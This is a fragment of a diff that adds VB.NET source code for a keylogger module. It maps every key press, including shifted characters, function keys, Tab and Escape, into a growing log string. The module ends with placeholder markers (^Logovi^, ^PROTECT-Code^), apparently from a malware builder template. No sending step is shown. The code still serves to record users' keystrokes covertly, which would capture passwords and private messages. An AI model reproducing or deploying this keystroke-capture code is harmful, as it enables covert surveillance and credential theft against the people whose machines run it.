+            ElseIf Key = Keys.D5 Then
+                ^Logovi^ = ^Logovi^ + "5"
+            ElseIf Key = Keys.D6 Then
+                ^Logovi^ = ^Logovi^ + "6"
+            ElseIf Key = Keys.D7 Then
+                ^Logovi^ = ^Logovi^ + "7"
+            ElseIf Key = Keys.D8 Then
+                ^Logovi^ = ^Logovi^ + "8"
+            ElseIf Key = Keys.D9 Then
+                ^Logovi^ = ^Logovi^ + "9"
+            ElseIf Key = Keys.D0 Then
+                ^Logovi^ = ^Logovi^ + "0"
+            ElseIf Key = Keys.A Then
+                ^Logovi^ = ^Logovi^ & "a"
+            ElseIf Key = Keys.B Then
+                ^Logovi^ = ^Logovi^ & "b"
+            ElseIf Key = Keys.C Then
+                ^Logovi^ = ^Logovi^ & "c"
+            ElseIf Key = Keys.D Then
+                ^Logovi^ = ^Logovi^ & "d"
+            ElseIf Key = Keys.E Then
+                ^Logovi^ = ^Logovi^ & "e"
+            ElseIf Key = Keys.F Then
+                ^Logovi^ = ^Logovi^ & "f"
+            ElseIf Key = Keys.G Then
+                ^Logovi^ = ^Logovi^ & "g"
+            ElseIf Key = Keys.H Then
+                ^Logovi^ = ^Logovi^ & "h"
+            ElseIf Key = Keys.I Then
+                ^Logovi^ = ^Logovi^ & "i"
+            ElseIf Key = Keys.J Then
+                ^Logovi^ = ^Logovi^ & "j"
+            ElseIf Key = Keys.K Then
+                ^Logovi^ = ^Logovi^ & "k"
+            ElseIf Key = Keys.L Then
+                ^Logovi^ = ^Logovi^ & "l"
+            ElseIf Key = Keys.M Then
+                ^Logovi^ = ^Logovi^ & "m"
+            ElseIf Key = Keys.N Then
+                ^Logovi^ = ^Logovi^ & "n"
+            ElseIf Key = Keys.O Then
+                ^Logovi^ = ^Logovi^ & "o"
+            ElseIf Key = Keys.P Then
+                ^Logovi^ = ^Logovi^ & "p"
+            ElseIf Key = Keys.Q Then
+                ^Logovi^ = ^Logovi^ & "q"
+            ElseIf Key = Keys.R Then
+                ^Logovi^ = ^Logovi^ & "r"
+            ElseIf Key = Keys.S Then
+                ^Logovi^ = ^Logovi^ & "s"
+            ElseIf Key = Keys.T Then
+                ^Logovi^ = ^Logovi^ & "t"
+            ElseIf Key = Keys.U Then
+                ^Logovi^ = ^Logovi^ & "u"
+            ElseIf Key = Keys.V Then
+                ^Logovi^ = ^Logovi^ & "v"
+            ElseIf Key = Keys.W Then
+                ^Logovi^ = ^Logovi^ & "w"
+            ElseIf Key = Keys.X Then
+                ^Logovi^ = ^Logovi^ & "x"
+            ElseIf Key = Keys.Y Then
+                ^Logovi^ = ^Logovi^ & "y"
+            ElseIf Key = Keys.Z Then
+                ^Logovi^ = ^Logovi^ & "z"
+            ElseIf Key = Keys.Oemcomma Then
+                ^Logovi^ = ^Logovi^ & ","
+            ElseIf Key = Keys.OemMinus Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.OemQuotes Then
+                ^Logovi^ = ^Logovi^ & "'"
+            ElseIf Key = Keys.OemOpenBrackets Then
+                ^Logovi^ = ^Logovi^ & "["
+            ElseIf Key = Keys.OemCloseBrackets Then
+                ^Logovi^ = ^Logovi^ & "]"
+            ElseIf Key = Keys.OemQuestion Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.OemPipe Then
+                ^Logovi^ = ^Logovi^ & "\"
+            ElseIf Key = Keys.Oem1 Then
+                ^Logovi^ = ^Logovi^ & ";"
+            ElseIf Key = Keys.OemPeriod Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Oemtilde Then
+                ^Logovi^ = ^Logovi^ & "`"
+            ElseIf Key = Keys.Space Then
+                ^Logovi^ = ^Logovi^ & " "
+            ElseIf Key = Keys.Enter Then
+                ^Logovi^ = ^Logovi^ & vbNewLine
+            ElseIf Key = Keys.F1 Then
+                ^Logovi^ = ^Logovi^ & "[F1]"
+            ElseIf Key = Keys.F2 Then
+                ^Logovi^ = ^Logovi^ & "[F2]"
+            ElseIf Key = Keys.F3 Then
+                ^Logovi^ = ^Logovi^ & "[F3]"
+            ElseIf Key = Keys.F4 Then
+                ^Logovi^ = ^Logovi^ & "[F4]"
+            ElseIf Key = Keys.F5 Then
+                ^Logovi^ = ^Logovi^ & "[F5]"
+            ElseIf Key = Keys.F6 Then
+                ^Logovi^ = ^Logovi^ & "[F6]"
+            ElseIf Key = Keys.F7 Then
+                ^Logovi^ = ^Logovi^ & "[F7]"
+            ElseIf Key = Keys.F8 Then
+                ^Logovi^ = ^Logovi^ & "[F8]"
+            ElseIf Key = Keys.F9 Then
+                ^Logovi^ = ^Logovi^ & "[F9]"
+            ElseIf Key = Keys.F10 Then
+                ^Logovi^ = ^Logovi^ & "[F10]"
+            ElseIf Key = Keys.F11 Then
+                ^Logovi^ = ^Logovi^ & "[F11]"
+            ElseIf Key = Keys.F12 Then
+                ^Logovi^ = ^Logovi^ & "[F12]"
+            ElseIf Key = Keys.Delete Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Back Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Down Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Up Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Left Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Right Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Tab Then
+                ^Logovi^ = ^Logovi^ & "[TAB]"
+            ElseIf Key = Keys.End Then
+                ^Logovi^ = ^Logovi^ & "[END]"
+            ElseIf Key = Keys.Escape Then
+                ^Logovi^ = ^Logovi^ & "[ESC]"
+            ElseIf Key = Keys.Divide Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.Decimal Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Subtract Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.Add Then
+                ^Logovi^ = ^Logovi^ & "+"
+            ElseIf Key = Keys.Multiply Then
+                ^Logovi^ = ^Logovi^ & "*"
+            End If
+        ElseIf My.Computer.Keyboard.ShiftKeyDown = True And My.Computer.Keyboard.CapsLock = False Then
+            If Key = Keys.D1 Then
+                ^Logovi^ = ^Logovi^ + "!"
+            ElseIf Key = Keys.D2 Then
+                ^Logovi^ = ^Logovi^ + "@"
+            ElseIf Key = Keys.D3 Then
+                ^Logovi^ = ^Logovi^ + "#"
+            ElseIf Key = Keys.D4 Then
+                ^Logovi^ = ^Logovi^ + "$"
+            ElseIf Key = Keys.D5 Then
+                ^Logovi^ = ^Logovi^ + "%"
+            ElseIf Key = Keys.D6 Then
+                ^Logovi^ = ^Logovi^ + "^"
+            ElseIf Key = Keys.D7 Then
+                ^Logovi^ = ^Logovi^ + "&"
+            ElseIf Key = Keys.D8 Then
+                ^Logovi^ = ^Logovi^ + "*"
+            ElseIf Key = Keys.D9 Then
+                ^Logovi^ = ^Logovi^ + "("
+            ElseIf Key = Keys.D0 Then
+                ^Logovi^ = ^Logovi^ + ")"
+            ElseIf Key = Keys.A Then
+                ^Logovi^ = ^Logovi^ & "A"
+            ElseIf Key = Keys.B Then
+                ^Logovi^ = ^Logovi^ & "B"
+            ElseIf Key = Keys.C Then
+                ^Logovi^ = ^Logovi^ & "C"
+            ElseIf Key = Keys.D Then
+                ^Logovi^ = ^Logovi^ & "D"
+            ElseIf Key = Keys.E Then
+                ^Logovi^ = ^Logovi^ & "E"
+            ElseIf Key = Keys.F Then
+                ^Logovi^ = ^Logovi^ & "F"
+            ElseIf Key = Keys.G Then
+                ^Logovi^ = ^Logovi^ & "G"
+            ElseIf Key = Keys.H Then
+                ^Logovi^ = ^Logovi^ & "H"
+            ElseIf Key = Keys.I Then
+                ^Logovi^ = ^Logovi^ & "I"
+            ElseIf Key = Keys.J Then
+                ^Logovi^ = ^Logovi^ & "J"
+            ElseIf Key = Keys.K Then
+                ^Logovi^ = ^Logovi^ & "K"
+            ElseIf Key = Keys.L Then
+                ^Logovi^ = ^Logovi^ & "L"
+            ElseIf Key = Keys.M Then
+                ^Logovi^ = ^Logovi^ & "M"
+            ElseIf Key = Keys.N Then
+                ^Logovi^ = ^Logovi^ & "N"
+            ElseIf Key = Keys.O Then
+                ^Logovi^ = ^Logovi^ & "O"
+            ElseIf Key = Keys.P Then
+                ^Logovi^ = ^Logovi^ & "P"
+            ElseIf Key = Keys.Q Then
+                ^Logovi^ = ^Logovi^ & "Q"
+            ElseIf Key = Keys.R Then
+                ^Logovi^ = ^Logovi^ & "R"
+            ElseIf Key = Keys.S Then
+                ^Logovi^ = ^Logovi^ & "S"
+            ElseIf Key = Keys.T Then
+                ^Logovi^ = ^Logovi^ & "T"
+            ElseIf Key = Keys.U Then
+                ^Logovi^ = ^Logovi^ & "U"
+            ElseIf Key = Keys.V Then
+                ^Logovi^ = ^Logovi^ & "V"
+            ElseIf Key = Keys.W Then
+                ^Logovi^ = ^Logovi^ & "W"
+            ElseIf Key = Keys.X Then
+                ^Logovi^ = ^Logovi^ & "X"
+            ElseIf Key = Keys.Y Then
+                ^Logovi^ = ^Logovi^ & "Y"
+            ElseIf Key = Keys.Z Then
+                ^Logovi^ = ^Logovi^ & "Z"
+            ElseIf Key = Keys.Oemcomma Then
+                ^Logovi^ = ^Logovi^ & "<"
+            ElseIf Key = Keys.OemMinus Then
+                ^Logovi^ = ^Logovi^ & "_"
+            ElseIf Key = Keys.OemOpenBrackets Then
+                ^Logovi^ = ^Logovi^ & "{"
+            ElseIf Key = Keys.OemCloseBrackets Then
+                ^Logovi^ = ^Logovi^ & "}"
+            ElseIf Key = Keys.OemQuestion Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.OemPipe Then
+                ^Logovi^ = ^Logovi^ & "|"
+            ElseIf Key = Keys.Oem1 Then
+                ^Logovi^ = ^Logovi^ & ":"
+            ElseIf Key = Keys.OemPeriod Then
+                ^Logovi^ = ^Logovi^ & ">"
+            ElseIf Key = Keys.Oemtilde Then
+                ^Logovi^ = ^Logovi^ & "~"
+            ElseIf Key = Keys.Space Then
+                ^Logovi^ = ^Logovi^ & " "
+            ElseIf Key = Keys.Enter Then
+                ^Logovi^ = ^Logovi^ & vbNewLine
+            ElseIf Key = Keys.F1 Then
+                ^Logovi^ = ^Logovi^ & "[F1]"
+            ElseIf Key = Keys.F2 Then
+                ^Logovi^ = ^Logovi^ & "[F2]"
+            ElseIf Key = Keys.F3 Then
+                ^Logovi^ = ^Logovi^ & "[F3]"
+            ElseIf Key = Keys.F4 Then
+                ^Logovi^ = ^Logovi^ & "[F4]"
+            ElseIf Key = Keys.F5 Then
+                ^Logovi^ = ^Logovi^ & "[F5]"
+            ElseIf Key = Keys.F6 Then
+                ^Logovi^ = ^Logovi^ & "[F6]"
+            ElseIf Key = Keys.F7 Then
+                ^Logovi^ = ^Logovi^ & "[F7]"
+            ElseIf Key = Keys.F8 Then
+                ^Logovi^ = ^Logovi^ & "[F8]"
+            ElseIf Key = Keys.F9 Then
+                ^Logovi^ = ^Logovi^ & "[F9]"
+            ElseIf Key = Keys.F10 Then
+                ^Logovi^ = ^Logovi^ & "[F10]"
+            ElseIf Key = Keys.F11 Then
+                ^Logovi^ = ^Logovi^ & "[F11]"
+            ElseIf Key = Keys.F12 Then
+                ^Logovi^ = ^Logovi^ & "[F12]"
+            ElseIf Key = Keys.Delete Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Back Then
+                ^Logovi^ = ^Logovi^.Remove(^Logovi^.Length - 1, 1)
+            ElseIf Key = Keys.Down Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Up Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Left Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Right Then
+                ^Logovi^ = ^Logovi^ & "?"
+            ElseIf Key = Keys.Tab Then
+                ^Logovi^ = ^Logovi^ & "[TAB]"
+            ElseIf Key = Keys.End Then
+                ^Logovi^ = ^Logovi^ & "[END]"
+            ElseIf Key = Keys.Escape Then
+                ^Logovi^ = ^Logovi^ & "[ESC]"
+            ElseIf Key = Keys.Divide Then
+                ^Logovi^ = ^Logovi^ & "/"
+            ElseIf Key = Keys.Decimal Then
+                ^Logovi^ = ^Logovi^ & "."
+            ElseIf Key = Keys.Subtract Then
+                ^Logovi^ = ^Logovi^ & "-"
+            ElseIf Key = Keys.Add Then
+                ^Logovi^ = ^Logovi^ & "+"
+            ElseIf Key = Keys.Multiply Then
+                ^Logovi^ = ^Logovi^ & "*"
+            ElseIf Key = Keys.OemQuotes Then
+                ^Logovi^ = ^Logovi^ & "'"
+            End If
+        End If
+    End Sub
+End Module
+^PROTECT-Code^
